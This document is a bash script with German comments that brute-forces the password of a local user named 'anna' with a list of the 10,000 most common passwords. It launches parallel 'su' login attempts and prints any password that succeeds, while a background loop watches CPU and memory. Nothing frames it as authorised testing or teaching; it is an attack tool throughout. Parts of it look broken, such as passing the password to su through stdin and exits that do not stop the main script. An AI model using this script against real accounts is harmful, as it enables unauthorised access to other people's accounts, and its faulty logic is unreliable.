#!/bin/bash

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path="./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username="anna"

# Anzahl der Prozesse, die gleichzeitig gestartet werden sollen
num_processes=10

# Maximale CPU-Auslastung in Prozent
max_cpu_usage=90

# Maximale Speicherauslastung in Prozent
max_mem_usage=90

# Funktion zur Überwachung der CPU-Auslastung
check_cpu_usage() {
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    if (( $(echo "$cpu_usage > $max_cpu_usage" | bc -l) )); then
        echo "CPU usage is too high (${cpu_usage}%)"
        exit 1
    fi
}

# Funktion zur Überwachung der Speicherauslastung
check_mem_usage() {
    local mem_usage=$(free | awk '/Mem/{printf "%.2f\n", $3/$2*100}')
    if (( $(echo "$mem_usage > $max_mem_usage" | bc -l) )); then
        echo "Memory usage is too high (${mem_usage}%)"
        exit 1
    fi
}

# Funktion, um Passwörter zu testen
check_password() {
    local password="$1"
    su - "$username" -c "whoami" <<< "$password" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
        exit 0
    fi
}

# Teile die Passwortliste in Unterlisten für jeden Prozess auf
split -n l/${num_processes} "$password_list_path" /tmp/password_list_

# Überwache die Ressourcennutzung in einer Schleife
while true; do
    check_cpu_usage
    check_mem_usage
    sleep 5  # Überwachung alle 5 Sekunden
done &

# Starte die Prozesse parallel
for sublist in /tmp/password_list_*; do
    while IFS= read -r password; do
        check_password "$password" &
    done < "$sublist"
done

# Warte auf das Ende der Überwachungsschleife, wenn das Skript beendet ist
wait
